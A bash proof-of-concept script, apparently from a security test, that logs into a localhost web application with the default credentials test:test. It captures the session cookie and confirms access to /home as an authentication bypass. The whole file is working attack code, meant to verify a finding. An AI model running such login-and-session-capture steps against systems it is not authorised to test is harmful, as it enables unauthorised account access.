#!/bin/bash

# POC: Default Credentials Authentication Bypass (test:test)
# This script demonstrates that the application accepts hardcoded default credentials
# without any restrictions, allowing complete authentication bypass.

TARGET_URL="http://localhost:80/login"
USERNAME="test"
PASSWORD="test"

echo "[*] Testing Default Credentials Authentication Bypass"
echo "[*] Target: $TARGET_URL"
echo "[*] Credentials: $USERNAME:$PASSWORD"
echo ""

# Attempt login with default credentials
echo "[*] Sending login request with default credentials..."
RESPONSE=$(curl -v -X POST "$TARGET_URL" \
  -d "username=$USERNAME&password=$PASSWORD" \
  -w "\n%{http_code}" \
  2>&1)

# Extract HTTP status code (last line)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""

# Check for redirect to /home (indicates successful authentication)
if echo "$RESPONSE_BODY" | grep -q "Location: /home"; then
  echo "[+] SUCCESS: Redirect to /home detected - Authentication bypass confirmed!"
  echo ""
fi

# Check for session cookie
if echo "$RESPONSE_BODY" | grep -q "Set-Cookie: session="; then
  SESSION_COOKIE=$(echo "$RESPONSE_BODY" | grep "Set-Cookie: session=" | head -1)
  echo "[+] Session cookie created: $SESSION_COOKIE"
  echo ""
fi

# Extract session token
SESSION_TOKEN=$(echo "$RESPONSE_BODY" | grep -oP 'session=\K[^;]+' | head -1)

if [ -n "$SESSION_TOKEN" ]; then
  echo "[+] Session token obtained: $SESSION_TOKEN"
  echo ""
  
  # Verify the session is valid by attempting to access /home
  echo "[*] Verifying session validity by accessing /home..."
  VERIFY_RESPONSE=$(curl -s -X GET "http://localhost:80/home" \
    -H "Cookie: session=$SESSION_TOKEN" \
    -w "\n%{http_code}")
  
  VERIFY_CODE=$(echo "$VERIFY_RESPONSE" | tail -n1)
  VERIFY_BODY=$(echo "$VERIFY_RESPONSE" | head -n-1)
  
  echo "[*] /home Response Code: $VERIFY_CODE"
  
  if [ "$VERIFY_CODE" = "200" ]; then
    echo "[+] CONFIRMED: Session token is valid and grants access to /home"
    echo "[+] CRITICAL VULNERABILITY: Default credentials allow full authentication bypass"
    exit 0
  fi
fi

if [ "$HTTP_CODE" = "302" ]; then
  echo "[+] CONFIRMED: HTTP 302 redirect indicates successful authentication"
  echo "[+] CRITICAL VULNERABILITY: Default credentials allow full authentication bypass"
  exit 0
else
  echo "[-] Unexpected response code: $HTTP_CODE"
  echo "[-] Response body:"
  echo "$RESPONSE_BODY"
  exit 1
fi